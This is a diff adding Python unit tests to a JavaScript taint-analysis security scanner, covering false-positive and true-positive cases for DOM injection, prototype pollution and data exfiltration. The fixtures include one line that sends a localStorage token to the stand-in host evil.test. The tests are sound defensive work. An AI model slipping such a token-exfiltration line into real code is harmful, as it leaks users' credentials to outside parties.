@@ -301,6 +301,97 @@ class SecretContextTest(unittest.TestCase):
         self.assertIn("Ab3x9Kq1Zp7m", context)
 
 
+class TaintPrecisionTest(unittest.TestCase):
+    """False-positive contracts for the source-to-sink engine.
+
+    The taint engine must prove a *data flow*, not a keyword coincidence.
+    These cases used to be reported as HIGH-confidence flows and were the
+    most common false positives: a static config property named ``value``,
+    a cookie *write* API mistaken for a cookie *read*, the ``length`` of a
+    tainted string, and ordinary URL/query reflection into the page's own
+    requests.
+    """
+
+    def _ids(self, code):
+        return [f.get("id") for f in analyze_taint(code, filename="t.js")]
+
+    def test_static_config_value_is_not_user_input(self):
+        self.assertEqual(self._ids("const cfg = { value: 'hello' }; el.innerHTML = cfg.value;"), [])
+        self.assertEqual(self._ids("const s = state.value; el.innerHTML = s;"), [])
+        self.assertEqual(self._ids("const o = options.value; el.innerHTML = o;"), [])
+
+    def test_real_form_value_reads_are_still_sources(self):
+        self.assertIn("dom_injection", self._ids(
+            "const v = document.querySelector('#x').value; el.innerHTML = v;"))
+        self.assertIn("dom_injection", self._ids(
+            "const v = form.elements.email.value; el.innerHTML = v;"))
+        self.assertIn("dom_injection", self._ids(
+            "const v = e.target.value; el.innerHTML = v;"))
+
+    def test_cookie_write_is_not_a_cookie_read(self):
+        self.assertEqual(self._ids(
+            "Cookies.set('theme', 'dark'); const t = Cookies.set('k','v'); el.innerHTML = t;"), [])
+        self.assertIn("dom_injection", self._ids(
+            "const t = Cookies.get('sid'); el.innerHTML = t;"))
+
+    def test_numeric_property_reads_do_not_propagate_taint(self):
+        self.assertEqual(self._ids("const q = location.hash; el.innerHTML = q.length;"), [])
+        # The line-fallback path must agree with the AST path.
+        self.assertEqual(self._ids(
+            '!function(){var q=location.hash;document.getElementById("o").innerHTML=q.length}();'), [])
+
+    def test_same_origin_query_reflection_is_not_exfiltration(self):
+        self.assertEqual(self._ids("fetch('/api/search?q=' + location.search);"), [])
+
+    def test_external_url_reflection_is_a_low_observation(self):
+        flows = analyze_taint(
+            "fetch('https://tracker.example/collect?q=' + location.search);", filename="t.js")
+        self.assertTrue(flows)
+        f = flows[0]
+        self.assertEqual(f.get("id"), "data_exfiltration_candidate")
+        self.assertEqual(f.get("severity"), "LOW")
+        self.assertTrue(f.get("observation"))
+
+    def test_sensitive_sources_to_network_are_still_high(self):
+        flows = analyze_taint(
+            "fetch('https://evil.test/c', {body: localStorage.getItem('token')});",
+            filename="t.js",
+        )
+        self.assertTrue(any(
+            f.get("id") == "data_exfiltration_flow" and f.get("severity") == "HIGH"
+            for f in flows
+        ))
+
+    def test_json_parse_merge_is_prototype_pollution(self):
+        ids = self._ids(
+            "const q = new URLSearchParams(location.search).get('key');\n"
+            "Object.assign(config, JSON.parse(q));")
+        self.assertIn("prototype_pollution", ids)
+
+    def test_plain_object_assign_stays_silent(self):
+        self.assertEqual(self._ids("Object.assign(config, { a: 1 });"), [])
+
+    def test_static_values_are_not_input_by_name(self):
+        # `input`/`payload`/`message` are input-ish names, but a statically
+        # known value is not user input, whatever the variable is called.
+        self.assertEqual(self._ids(
+            "const input = 'welcome';\ndocument.body.innerHTML = input;"), [])
+        self.assertEqual(self._ids(
+            "const payload = { text: 'hello' };\n"
+            "document.body.innerHTML = payload.text;"), [])
+        self.assertEqual(self._ids(
+            "const message = 'hi';\nel.innerHTML = message;"), [])
+
+    def test_reassignment_to_static_clears_earlier_taint(self):
+        # Both the AST path and the line-fallback must drop the old source
+        # once the variable is reassigned to a constant.
+        self.assertEqual(self._ids(
+            "let q = location.hash;\nq = '/about';\nel.innerHTML = q;"), [])
+        self.assertEqual(self._ids(
+            "let q = '/about';\nq = location.hash;\nel.innerHTML = q;"),
+            ["dom_injection"])
+
+
 class ExtraSourceTest(unittest.TestCase):
     """Audit H13: sources that used to be invisible."""
 
